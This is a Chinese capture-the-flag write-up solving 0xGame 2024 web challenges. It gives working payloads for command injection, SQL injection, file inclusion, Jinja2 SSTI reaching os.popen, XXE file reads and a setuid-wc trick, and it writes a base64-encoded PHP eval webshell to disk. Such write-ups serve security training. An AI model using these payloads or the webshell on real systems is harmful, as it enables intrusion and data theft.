---
title: "0xGame2024_web部分解"
date: "2026-04-15"
lastmod: "2026-08-15T00:00:00+08:00"
slug: "0XGAME2024"
summary: ""
tags:
  - "Python"
  - "PHP"
params:
  protected: false
  commentId: "0XGAME2024"
  legacyId: "0XGAME2024"
cover: ""
draft: false
---

# 1.hello_web

<!-- 看看f14g.php -->
    <!-- 此乃flag的第一段：0xGame{ee7f2040-1987-4e0a -->

看响应包

```
æ­¤ä¹�flagç��ç¬¬äº�æ®µï¼�-872d-68589c4ab3d3}
```

# 2.ez_login

0xGame{It_Is_Easy_Right?}

弱密码爆破

# 3.ez_rce

```python
from flask import Flask, request
import subprocess

app = Flask(__name__)


@app.route("/")
def index():
    return open(__file__).read()


@app.route("/calc", methods=['POST'])
def calculator():
    expression = request.form.get('expression') or "114 1000 * 514 + p"
    result = subprocess.run(["dc", "-e", expression], capture_output=True, text=True)
    return result.stdout


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

代码：

```python
from flask import Flask, request
import subprocess  # 用于执行系统命令

app = Flask(__name__)  # 初始化 Flask 应用


@app.route("/")
def index():
    # 访问根路径时，返回当前文件的源代码
    return open(__file__).read()


@app.route("/calc", methods=['POST'])
def calculator():
    # 获取 POST 请求中 form 表单的 expression 参数，默认值为 "114 1000 * 514 + p"
    expression = request.form.get('expression') or "114 1000 * 514 + p"
    # 调用 subprocess.run 执行 dc 命令（dc -e 用于执行表达式）
    # capture_output=True 捕获命令输出，text=True 以文本形式返回结果
    result = subprocess.run(["dc", "-e", expression], capture_output=True, text=True)
    # 返回 dc 命令的标准输出
    return result.stdout


if __name__ == "__main__":
    # 启动 Flask 服务，监听所有网卡的 8000 端口
    app.run(host="0.0.0.0", port=8000)
```

这里：
`dc` 命令的 `-e` 参数支持执行多个表达式（用分号分隔），且 `subprocess.run` 直接将用户可控的 `expression` 传入命令行，攻击者可通过构造恶意表达式注入系统命令。

使用：/calc

```
expression=!env
```

# 4.ez_sql

```
/?id=1 union select 1,2,3,4,5#
```

```
/?id=1 union select 1,2,3,4,sql from sqlite_master#
```

```
/?id=1 union select 1,2,3,4,flag from flag#
```

# 5.hello_http

![1773824942769](/assets/img/1773824942769.png)

# 6.hello_include

```
/phpinfo.php
```

```
flag_0xgame_position 	/s3cr3t/f14g 
```

访问：/index.phps

```
<?php
echo "Hint: The source code contains important information that must not be disclosed.<br>";
$allowed = ['hello.php', 'phpinfo.php'];
if (isset($_POST['f1Ie'])) {
    if (strpos($_POST['f1Ie'], 'php://') !== false) {
        die('涓嶅厑璁竝hp://');
    }
    include $_POST['f1Ie'];
} else {
    include 'hello.php';
}
```

```
index.php 和 index.phps 文件之间的主要区别在于它们的文件扩展名。

index.php: 这是一个标准的 PHP 文件，通常用于编写 PHP 代码。当用户访问 index.php 文件时，Web 服务器会解释其中的 PHP 代码，并将结果发送给用户的浏览器。PHP 文件可以包含 HTML、CSS、JavaScript 以及服务器端的 PHP 代码。

index.phps: 这个文件名可能是由开发人员自定义的，它的扩展名 .phps 是一种特殊的命名约定，通常用于显示 PHP 源代码而不是执行它。如果用户访问 index.phps 文件，Web 服务器通常会直接将文件内容发送给浏览器，而不会解释其中的 PHP 代码。这对于演示和学习目的可能会有用，但不建议在生产环境中使用这种方式，因为它会暴露服务器端的代码。

总之，index.php 是一个标准的 PHP 文件，用于执行 PHP 代码，而 index.phps 可能用于显示 PHP 源代码。
————————————————
版权声明：本文为CSDN博主「你挡我发光了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_51520483/article/details/138632477
```

请输入文本：

```
f1Ie=%2Fs3cr3t%2Ff14g
```



# 7.ez_ssti

```python
from flask import Flask, request, render_template, render_template_string
import os
app = Flask(__name__)

flag=os.getenv("flag")   #进入内存
os.unsetenv("flag")		#删掉flag，，躺在哪里？？
@app.route('/')
def index():
    return open(__file__, "r").read()    #r


@app.errorhandler(404)
def page_not_found(e):			#传入错误的路径可以触发打印其内容
    print(request.root_url)   
    return render_template_string("<h1>The Url {} You Requested Can Not Found</h1>".format(request.url))


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000)

```

比如说：/{{7*7}}，页面回显

```
The Url http://challenge.imxbt.cn:32572/49 You Requested Can Not Found
```

找索引：

```python
import requests

# 这里的 URL 是题目给的基础地址
base_url = "http://challenge.imxbt.cn:32572/"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
}

for i in range(500):
    # 核心：直接把 Payload 拼接到 URL 路径中
    # 注意：Jinja2 在 URL 中有时需要对特殊字符进行处理，但 requests 通常会自动处理
    payload = "{{().__class__.__bases__[0].__subclasses__()[" + str(i) + "]}}"
    target_url = base_url + payload
    
    try:
        # 发送 GET 请求，因为代码里是 request.url 触发 404
        res = requests.get(url=target_url, headers=headers, timeout=2)
        
        # 如果页面返回的内容里包含我们要找的类名
        if 'os._wrap_close' in res.text:
            print(f"找到索引啦！索引值为: {i}")
            break 
    except Exception as e:
        pass
```

得到：

134

```python
{{().__class__.__bases__[0].__subclasses__()[134]}}
```

```
The Url http://challenge.imxbt.cn:32572/&lt;class &#39;os._wrap_close&#39;&gt; You Requested Can Not Found
```

直接看环境：

```
{{().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['popen']('env').read()}}
```

%20不被认为空格

于是构造：

```
{%set%20getitem = dict(__getitem__=1)|join%}
{%set%20kg=({}|select()|string()|attr(getitem)(10))%}
{{().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['popen']('ls(kg)/').read()}}
```

```
{%set getitem=dict(__getitem__=1)|join%}{%set kg=({}|select()|string()|attr(getitem)(10))%}{{().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['popen']('ls'~kg~'/').read()}}
```

大失败，我想多了

666这样做：

```
{{().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['popen'](request.args.cmd).read()}}?cmd=ls /
```

成功读取到根目录

flag变量在env中已经被删除了，但是仍然存在，找到它的当前位置

ok看答案：
找当前模块



```
{{ ().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['__builtins__']['__import__']('sys').modules['__main__'].flag }}
```

气死我了，暴力读flag：

```
{{().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['popen'](request.args.cmd).read()}}?cmd=cat /proc/self/maps
```

# 8.hello_shell

```php
 <?php
highlight_file(__FILE__);
$cmd = $_REQUEST['cmd'] ?? 'ls';
if (strpos($cmd, ' ') !== false) {
    echo strpos($cmd, ' ');
    die('no space allowed');
}
@exec($cmd); // 没有回显怎么办？ 
```



```
?cmd=ls${IFS}/|tee${IFS}1.txt
或者说
?cmd=ls${IFS}/>1.txt
```

读取不了flag

```
/?cmd=cat${IFS}/flag|tee${IFS}1.txt
```

不管了，决定写木马进去

```
echo${IFS}PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==|base64${IFS}-d>shell.php
```

于是有：

```
http://challenge.imxbt.cn:32097/shell.php
1
```

一进去就是熟悉的ws文件，无敌了

我的评价是照搬ghctf2025的geshell解法：

```
sudo install -m =xs $(which wc)
./wc --files0-from "/flag"
```

得到flag



# 9.baby_xxe

```python
from flask import Flask,request
import base64
from lxml import etree
app = Flask(__name__)

@app.route('/')
def index():
    return open(__file__).read()


@app.route('/parse',methods=['POST'])
def parse():
    xml=request.form.get('xml')
    print(xml)
    if xml is None:
        return "None"
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name=root.find('name').text
    return name or None



if __name__=="__main__":
    app.run(host='0.0.0.0',port=8000)
```

需要子标签为name的无过滤xxe

```http
POST /parse HTTP/1.1
Host: challenge.imxbt.cn:32525
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 165
Origin: http://challenge.imxbt.cn:32525
Connection: keep-alive
Referer: http://challenge.imxbt.cn:32525/parse
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.abpmnA.OOyan3DOBxvBTdk2yfjFwDBUH88
Upgrade-Insecure-Requests: 1
Priority: u=0, i

xml=<%3fxml+version%3d"1.0"%3f>
<!DOCTYPE+test+[
++++++++<!ELEMENT+test+ANY+>

++++<!ENTITY+ddd+SYSTEM+"file%3a///flag">
]>
<test><name>%26ddd%3b</name></test>
```

这里是bp对于特殊字符进行url编码

解析：

```
当你使用 <test>...</test> 作为根标签时，它与 DTD 定义的名称完全一致。
吻合：parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
当使用<name>...</name>作为子标签的时候，符合name=root.find('name').text
```


